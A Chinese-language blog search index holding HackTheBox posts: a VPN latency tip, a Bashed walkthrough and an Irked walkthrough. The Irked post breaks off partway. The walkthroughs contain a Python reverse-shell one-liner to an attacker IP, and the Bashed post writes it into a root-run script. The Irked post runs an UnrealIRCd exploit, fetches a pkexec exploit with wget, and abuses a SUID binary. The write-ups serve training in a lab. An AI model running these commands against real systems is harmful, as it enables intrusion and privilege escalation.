<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>HackTheBox-网络延迟优化</title>
    <url>/Hackthebox/htb/hackthebox/</url>
    <content><![CDATA[<img src="/Hackthebox/htb/hackthebox/image-20250411140726536.png" class="">

<span id="more"></span>

<h3 id="1-优化结果"><a href="#1-优化结果" class="headerlink" title="1. 优化结果"></a>1. 优化结果</h3><h4 id="网络优化前"><a href="#网络优化前" class="headerlink" title="网络优化前"></a>网络优化前</h4><img src="/Hackthebox/htb/hackthebox/image-20250410225239612.png" class="" title="延迟">

<h4 id="网络优化后"><a href="#网络优化后" class="headerlink" title="网络优化后"></a>网络优化后</h4><img src="/Hackthebox/htb/hackthebox/image-20250410230011943.png" class="" title="延迟">



<h3 id="2-操作步骤"><a href="#2-操作步骤" class="headerlink" title="2. 操作步骤"></a>2. 操作步骤</h3><h4 id="1-选择节点"><a href="#1-选择节点" class="headerlink" title="1.选择节点"></a>1.选择节点</h4><p>最好选择新加坡节点并且选择TCP 443</p>
<img src="/Hackthebox/htb/hackthebox/image-20250410230624757.png" class="" title="OpenVPN节点">

<h4 id="2-配置VPN文件"><a href="#2-配置VPN文件" class="headerlink" title="2. 配置VPN文件"></a>2. 配置VPN文件</h4><p>打开下载的VPN配置文件，可以看到远程地址为hackthebox.eu，在配置文件中添加代理，使OpenVPN 通过代理接入hackthebox</p>
<p>http代理：http-proxy  ip port</p>
<p>socks5 代理：socks-proxy ip port </p>
<img src="/Hackthebox/htb/hackthebox/image-20250410234918886.png" class="" title="OpenVPN配置">

<h4 id="3-代理配置"><a href="#3-代理配置" class="headerlink" title="3.代理配置"></a>3.代理配置</h4><h5 id="Shadowrocket"><a href="#Shadowrocket" class="headerlink" title="Shadowrocket"></a>Shadowrocket</h5><p>节点最好启用新加坡节点和hackthebox保持一致，确保全局路由为配置，后面会修改配置文件</p>
<img src="/Hackthebox/htb/hackthebox/image-20250410231454084.png" class="" title="shadowrocket配置">

<p>编辑已经启用的配置文件</p>
<img src="/Hackthebox/htb/hackthebox/8bc936b78cd0d13f554c9222008a49c1.jpg" class="" title="shadowrocket配置">

<p>选中规则并添加</p>
<img src="/Hackthebox/htb/hackthebox/cb12c060679dc74320061baa709f7a34.jpg" class="" title="shadowrocket配置">

<p>类型选择<code>DOMAIN-KEYWORD</code> 策略选择<code>PROXY</code> 域名填写 hackthebox 这个就是OpenVPN配置文件中那个域名，如果是使用pwnbox的话，可以把<code>htb</code> 添加到域名那栏</p>
<img src="/Hackthebox/htb/hackthebox/227a91d96734bec314c24413838c530f.jpg" class="" title="shadowrocket配置">

<p>注意保存，确保规则有效</p>
<img src="/Hackthebox/htb/hackthebox/43ad2ecee9d2edc8fa497daf420769fd.jpg" class="" title="shadowrocket配置">

<p>打开代理共享，并将地址配置到OpenVPN配置文件中</p>
<img src="/Hackthebox/htb/hackthebox/1e6f487557bb177f8be2a20e335b4ade.jpg" class="" title="shadowrocket配置">

<h5 id="Clash"><a href="#Clash" class="headerlink" title="Clash"></a>Clash</h5><p>在Clash设置中启用<code>虚拟网卡模式</code>  端口设置中打开<code>SOCKS代理端口</code>  </p>
<img src="/Hackthebox/htb/hackthebox/image-20250410232456699.png" class="" title="clash配置">

<p>打开订阅，右键<code>订阅文件</code>点击<code>编辑规则</code></p>
<img src="/Hackthebox/htb/hackthebox/image-20250410234047925.png" class="" title="clash配置">

<p>在编辑规则中 ：规则类型选择<code>DOMAIN-KEYWORD</code> ，代理策略选择代理组，规则内容填写 hackthebox</p>
<img src="/Hackthebox/htb/hackthebox/image-20250410234207924.png" class="" title="clash配置">

<p>代理组的选择取决于订阅，节点依旧选择同地区，注意更新订阅可能会覆盖自定义规则</p>
<img src="/Hackthebox/htb/hackthebox/image-20250410234325521.png" class="" title="clash配置">





]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>HTB网络延迟优化</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Bashed</title>
    <url>/Hackthebox/htb/htb-Bashed/</url>
    <content><![CDATA[<style>.wjdcnebtngjx{zoom:50%;}</style><img src="/Hackthebox/htb/htb-Bashed/0f058b73659ca043de9f5240abd651ca.png" class="wjdcnebtngjx" alt="Bashed">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th>Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Linux</td>
<td>Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.10.68 <span class="token parameter variable">-T4</span> -p- --min-rate <span class="token number">1000</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sC</span>      
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-04-21 <span class="token number">22</span>:53 CST
Warning: <span class="token number">10.10</span>.10.68 giving up on port because retransmission cap hit <span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>.
Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.68
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.098s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">47313</span> closed tcp ports <span class="token punctuation">(</span>conn-refused<span class="token punctuation">)</span>, <span class="token number">18221</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
PORT   STATE SERVICE VERSION
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.18 <span class="token variable"><span class="token punctuation">((</span>Ubuntu<span class="token punctuation">))</span></span>
<span class="token operator">|</span>_http-title: Arrexel's Development Site

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">237.89</span> seconds</code></pre>

<p>访问80端口，存在站点</p>
<img src="/Hackthebox/htb/htb-Bashed/image-20250421235102449.png" class="" title="phpbash">

<h3 id="FUZZ"><a href="#FUZZ" class="headerlink" title="FUZZ"></a>FUZZ</h3><p>使用ffuf猜解目录，找到dev目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ ffuf <span class="token parameter variable">-w</span> /opt/secLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ <span class="token parameter variable">-u</span> <span class="token string">'http://10.10.10.68/FUZZ'</span>  <span class="token parameter variable">-ic</span> <span class="token parameter variable">-t</span> <span class="token number">100</span> 

        /<span class="token string">'___\  /'</span>___<span class="token punctuation">\</span>           /'___<span class="token punctuation">\</span>       
       /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/ /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/  __  __  /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/       
       <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span><span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>      
        <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/ <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/      
         <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>   <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>  <span class="token punctuation">\</span> <span class="token punctuation">\</span>____/  <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>       
          <span class="token punctuation">\</span>/_/    <span class="token punctuation">\</span>/_/   <span class="token punctuation">\</span>/___/    <span class="token punctuation">\</span>/_/       

       v2.1.0-dev
________________________________________________

 :: Method           <span class="token builtin class-name">:</span> GET
 :: URL              <span class="token builtin class-name">:</span> http://10.10.10.68/FUZZ
 :: Wordlist         <span class="token builtin class-name">:</span> FUZZ: /opt/secLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
 :: Calibration      <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
 :: Timeout          <span class="token builtin class-name">:</span> <span class="token number">10</span>
 :: Threads          <span class="token builtin class-name">:</span> <span class="token number">100</span>
 :: Matcher          <span class="token builtin class-name">:</span> Response status: <span class="token number">200</span>-299,301,302,307,401,403,405,500
________________________________________________

                        <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">7743</span>, Words: <span class="token number">2956</span>, Lines: <span class="token number">162</span>, Duration: 213ms<span class="token punctuation">]</span>
images                  <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">311</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 242ms<span class="token punctuation">]</span>
uploads                 <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">312</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 100ms<span class="token punctuation">]</span>
php                     <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">308</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 86ms<span class="token punctuation">]</span>
css                     <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">308</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 580ms<span class="token punctuation">]</span>
dev                     <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">308</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 2534ms<span class="token punctuation">]</span>
js                      <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">307</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 150ms<span class="token punctuation">]</span>
fonts                   <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">310</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 99ms<span class="token punctuation">]</span>
                        <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">7743</span>, Words: <span class="token number">2956</span>, Lines: <span class="token number">162</span>, Duration: 90ms<span class="token punctuation">]</span>
server-status           <span class="token punctuation">[</span>Status: <span class="token number">403</span>, Size: <span class="token number">299</span>, Words: <span class="token number">22</span>, Lines: <span class="token number">12</span>, Duration: 116ms<span class="token punctuation">]</span></code></pre>

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问dev目录，点击phpbash.php，发现控制台</p>
<img src="/Hackthebox/htb/htb-Bashed/image-20250421230255079.png" class="" title="image-20250421230255079">

<p>可以成功执行命令，利用控制台反弹shell</p>
<img src="/Hackthebox/htb/htb-Bashed/image-20250421235020611.png" class="" title="image-20250421235020611">

<pre class="language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-c</span> <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.33",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</span></code></pre>

<p>成功接收到shell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">9001</span>                                   
Listening on <span class="token number">0.0</span>.0.0 <span class="token number">9001</span>
Connection received on <span class="token number">10.10</span>.10.68 <span class="token number">51968</span>
www-data@bashed:/var/www/html$ <span class="token function">ls</span>
about.html    css	   fonts       js	    single.html
config.php    demo-images  images      php	    style.css
contact.html  dev	   index.html  scroll.html  uploads</code></pre>

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>查看sudo 配置，发现可以直接切换scriptmanager </p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@bashed:/var/www/html$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> www-data on bashed:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin

User www-data may run the following commands on bashed:
    <span class="token punctuation">(</span>scriptmanager <span class="token builtin class-name">:</span> scriptmanager<span class="token punctuation">)</span> NOPASSWD: ALL
www-data@bashed:/var/www/html$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> scriptmanager <span class="token function">bash</span> <span class="token parameter variable">-i</span>
scriptmanager@bashed:/scripts$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>scriptmanager<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>scriptmanager<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>scriptmanager<span class="token punctuation">)</span></code></pre>

<p>查找可利用文件，在&#x2F;scripts目录下，找到test.py和test.txt 文件，可以发现test.txt文件的权限为root 创建时间是刚刚，所以可以尝试覆盖test.py来进行提权</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">scriptmanager@bashed:/var/www/html$ <span class="token function">ls</span> /
<span class="token function">ls</span> /
bin   etc         lib         media  proc  sbin     sys  var
boot  home        lib64       mnt    root  scripts  tmp  vmlinuz
dev   initrd.img  lost+found  opt    run   srv      usr
scriptmanager@bashed:/scripts$ <span class="token function">ls</span> <span class="token parameter variable">-la</span>
<span class="token function">ls</span> <span class="token parameter variable">-la</span>
total <span class="token number">16</span>
drwxrwxr--  <span class="token number">2</span> scriptmanager scriptmanager <span class="token number">4096</span> Jun  <span class="token number">2</span>  <span class="token number">2022</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">23</span> root          root          <span class="token number">4096</span> Jun  <span class="token number">2</span>  <span class="token number">2022</span> <span class="token punctuation">..</span>
-rw-r--r--  <span class="token number">1</span> scriptmanager scriptmanager  <span class="token number">213</span> Apr <span class="token number">21</span> 08:22 test.py
-rw-r--r--  <span class="token number">1</span> root          root            <span class="token number">12</span> Apr <span class="token number">21</span> 08:22 test.txt</code></pre>

<p>使用python反弹shell命令覆盖test.py 内容，然后等待一会</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">scriptmanager@bashed:/scripts$ <span class="token builtin class-name">echo</span> <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.33",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</span> <span class="token operator">></span> test.py
<span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>,2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">import</span> pty<span class="token punctuation">;</span> pty.spawn<span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">)</span>' <span class="token operator">></span> test.py                         
</code></pre>

<p>成功获得root权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">9002</span>
Listening on <span class="token number">0.0</span>.0.0 <span class="token number">9002</span>
Connection received on <span class="token number">10.10</span>.10.68 <span class="token number">41970</span>
root@bashed:/scripts<span class="token comment"># id       </span>
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>
</code></pre>

<table>
<thead>
<tr>
<th>Flag</th>
<th>Path</th>
</tr>
</thead>
<tbody><tr>
<td>flag1</td>
<td>&#x2F;home&#x2F;arrexel&#x2F;user.txt</td>
</tr>
<tr>
<td>flag2</td>
<td>&#x2F;root&#x2F;root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>配置错误</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Irked</title>
    <url>/Hackthebox/htb/htb-Irked/</url>
    <content><![CDATA[<style>.lsiaknorblbh{zoom:50%;}</style><img src="/Hackthebox/htb/htb-Irked/5fb846e75cf0db0c4b27e2dc64a9bf82.png" class="lsiaknorblbh">

<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Linux</td>
<td align="left">Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.10.117 <span class="token parameter variable">-T4</span> -p- --min-rate <span class="token number">1000</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sC</span>        
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-04-19 <span class="token number">23</span>:18 CST
Warning: <span class="token number">10.10</span>.10.117 giving up on port because retransmission cap hit <span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>.
Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.117
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.10s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65130</span> closed tcp ports <span class="token punctuation">(</span>conn-refused<span class="token punctuation">)</span>, <span class="token number">398</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
PORT      STATE SERVICE VERSION
<span class="token number">22</span>/tcp    <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">6</span>.7p1 Debian <span class="token number">5</span>+deb8u4 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">1024</span> 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad <span class="token punctuation">(</span>DSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">2048</span> <span class="token number">75</span>:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp    <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.10 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span>
<span class="token operator">|</span>_http-title: Site doesn't have a title <span class="token punctuation">(</span>text/html<span class="token punctuation">)</span>.
<span class="token operator">|</span>_http-server-header: Apache/2.4.10 <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span>
<span class="token number">111</span>/tcp   <span class="token function">open</span>  rpcbind <span class="token number">2</span>-4 <span class="token punctuation">(</span>RPC <span class="token comment">#100000)</span>
<span class="token operator">|</span> rpcinfo: 
<span class="token operator">|</span>   program version    port/proto  <span class="token function">service</span>
<span class="token operator">|</span>   <span class="token number">100000</span>  <span class="token number">2,3</span>,4        <span class="token number">111</span>/tcp   rpcbind
<span class="token operator">|</span>   <span class="token number">100000</span>  <span class="token number">2,3</span>,4        <span class="token number">111</span>/udp   rpcbind
<span class="token operator">|</span>   <span class="token number">100000</span>  <span class="token number">3,4</span>          <span class="token number">111</span>/tcp6  rpcbind
<span class="token operator">|</span>   <span class="token number">100000</span>  <span class="token number">3,4</span>          <span class="token number">111</span>/udp6  rpcbind
<span class="token operator">|</span>   <span class="token number">100024</span>  <span class="token number">1</span>          <span class="token number">40082</span>/tcp   status
<span class="token operator">|</span>   <span class="token number">100024</span>  <span class="token number">1</span>          <span class="token number">57955</span>/udp6  status
<span class="token operator">|</span>   <span class="token number">100024</span>  <span class="token number">1</span>          <span class="token number">59551</span>/udp   status
<span class="token operator">|</span>_  <span class="token number">100024</span>  <span class="token number">1</span>          <span class="token number">59805</span>/tcp6  status
<span class="token number">6697</span>/tcp  <span class="token function">open</span>  irc     UnrealIRCd
<span class="token number">8067</span>/tcp  <span class="token function">open</span>  irc     UnrealIRCd
<span class="token number">40082</span>/tcp <span class="token function">open</span>  status  <span class="token number">1</span> <span class="token punctuation">(</span>RPC <span class="token comment">#100024)</span>
<span class="token number">65534</span>/tcp <span class="token function">open</span>  irc     UnrealIRCd
Service Info: Host: irked.htb<span class="token punctuation">;</span> OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">130.19</span> seconds
</code></pre>

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用 irc 客户端(hexchat和irssi都可以)访问6697 端口，可以看到连接信息中返回的“Unreal3.2.8.1”</p>
<img src="/Hackthebox/htb/htb-Irked/image-20250419231152208.png" class="" title="irc">

<p>通过检索，找到exp，修改脚本并执行</p>
<img src="/Hackthebox/htb/htb-Irked/image-20250420005219142.png" class="" title="github">

<pre class="language-bash" data-language="bash"><code class="language-bash">$ python3 exploit.py <span class="token number">10.10</span>.10.117 <span class="token number">6697</span>  <span class="token parameter variable">-payload</span> python</code></pre>

<p>成功接收到shell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">9001</span>           
Listening on <span class="token number">0.0</span>.0.0 <span class="token number">9001</span>
Connection received on <span class="token number">10.10</span>.10.117 <span class="token number">37922</span>
bash: cannot <span class="token builtin class-name">set</span> terminal process group <span class="token punctuation">(</span><span class="token number">601</span><span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> device
bash: no job control <span class="token keyword">in</span> this shell
ircd@irked:~/Unreal3.2$ <span class="token function">id</span>
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>ircd<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>ircd<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>ircd<span class="token punctuation">)</span></code></pre>

<h3 id="路径一"><a href="#路径一" class="headerlink" title="路径一"></a>路径一</h3><p>查找 root 权限的二进制文件, 找到<code>/usr/bin/pkexec </code>和 <code>/usr/bin/viewuser</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">ircd@irked:~$ <span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> /4000 <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
<span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> /4000 <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
/usr/bin/pkexec
/usr/bin/X
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/viewuser
/sbin/mount.nfs
/bin/su
<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span></code></pre>

<h4 id="权限提升-方案一"><a href="#权限提升-方案一" class="headerlink" title="权限提升(方案一)"></a>权限提升(方案一)</h4><p>利用<code>/usr/bin/pkexec</code>: 查看目标机器环境中是否有gcc ，下载cve-2021-4034 exp 编译并执行</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">ircd@irked:~$ gcc <span class="token parameter variable">-v</span>
Using built-in specs.
<span class="token assign-left variable">COLLECT_GCC</span><span class="token operator">=</span>gcc
<span class="token assign-left variable">COLLECT_LTO_WRAPPER</span><span class="token operator">=</span>/usr/lib/gcc/i586-linux-gnu/4.9/lto-wrapper
Target: i586-linux-gnu
Configured with: <span class="token punctuation">..</span>/src/configure <span class="token parameter variable">-v</span> --with-pkgversion<span class="token operator">=</span><span class="token string">'Debian 4.9.2-10+deb8u1'</span> --with-
<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
Thread model: posix
gcc version <span class="token number">4.9</span>.2 <span class="token punctuation">(</span>Debian <span class="token number">4.9</span>.2-10+deb8u1<span class="token punctuation">)</span> 
ircd@irked:~$ <span class="token builtin class-name">cd</span> /tmp
ircd@irked:/tmp$ <span class="token function">wget</span> http://10.10.16.24/cve-2021-4034-poc.c 
--2025-04-19 <span class="token number">11</span>:48:18--  http://10.10.16.24/cve-2021-4034-poc.c
Connecting to <span class="token number">10.10</span>.16.24:80<span class="token punctuation">..</span>. connected.
HTTP request sent, awaiting response<span class="token punctuation">..</span>. <span class="token number">200</span> OK
Length: <span class="token number">1267</span> <span class="token punctuation">(</span><span class="token number">1</span>.2K<span class="token punctuation">)</span> <span class="token punctuation">[</span>text/x-csrc<span class="token punctuation">]</span>
Saving to: ‘cve-2021-4034-poc.c’
     0K <span class="token builtin class-name">.</span>                                                     <span class="token number">100</span>%  <span class="token assign-left variable">305M</span><span class="token operator">=</span>0s
<span class="token number">2025</span>-04-19 <span class="token number">11</span>:48:20 <span class="token punctuation">(</span><span class="token number">305</span> MB/s<span class="token punctuation">)</span> - ‘cve-2021-4034-poc.c’ saved <span class="token punctuation">[</span><span class="token number">1267</span>/1267<span class="token punctuation">]</span>
ircd@irked:/tmp$ <span class="token function">ls</span>
cve-2021-4034-poc.c
systemd-private-76f5017c0bbf4b1a9144ade090a6067e-colord.service-0MGbig
systemd-private-76f5017c0bbf4b1a9144ade090a6067e-cups.service-auGCve
systemd-private-76f5017c0bbf4b1a9144ade090a6067e-rtkit-daemon.service-cvkGJc
vmware-root
ircd@irked:/tmp$ gcc cve-2021-4034-poc.c <span class="token parameter variable">-o</span> cve-2021-4034-poc 
gcc cve-2021-4034-poc.c <span class="token parameter variable">-o</span> cve-2021-4034-poc 

ircd@irked:/tmp$ ./cve-2021-4034-poc                           
./cve-2021-4034-poc
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>,1001<span class="token punctuation">(</span>ircd<span class="token punctuation">)</span></code></pre>

<h4 id="权限提升-方案二"><a href="#权限提升-方案二" class="headerlink" title="权限提升(方案二)"></a>权限提升(方案二)</h4><p>利用<code>/usr/bin/viewuser</code>: 运行命令提示没有找到<code>/tmp/listusers</code> ，创建此文件并添加执行权限，重新运行命令即可提权成功</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">ircd@irked:~$ /usr/bin/viewuser 
<span class="token punctuation">(</span>unknown<span class="token punctuation">)</span> :0           <span class="token number">2025</span>-04-19 <span class="token number">10</span>:00 <span class="token punctuation">(</span>:0<span class="token punctuation">)</span>
sh: <span class="token number">1</span>: /tmp/listusers: not found
This application is being devleoped to <span class="token builtin class-name">set</span> and <span class="token builtin class-name">test</span> user permissions
It is still being actively developed
ircd@irked:~$ <span class="token builtin class-name">echo</span> <span class="token string">'/bin/sh'</span> <span class="token operator">></span> /tmp/listusers 
ircd@irked:~$ <span class="token function">chmod</span> +x /tmp/listusers
ircd@irked:~$ /usr/bin/viewuser
<span class="token punctuation">(</span>unknown<span class="token punctuation">)</span> :0           <span class="token number">2025</span>-04-19 <span class="token number">10</span>:00 <span class="token punctuation">(</span>:0<span class="token punctuation">)</span>
djmardov pts/0        <span class="token number">2025</span>-04-19 <span class="token number">12</span>:05 <span class="token punctuation">(</span><span class="token number">10.10</span>.16.24<span class="token punctuation">)</span>
<span class="token function">id</span>
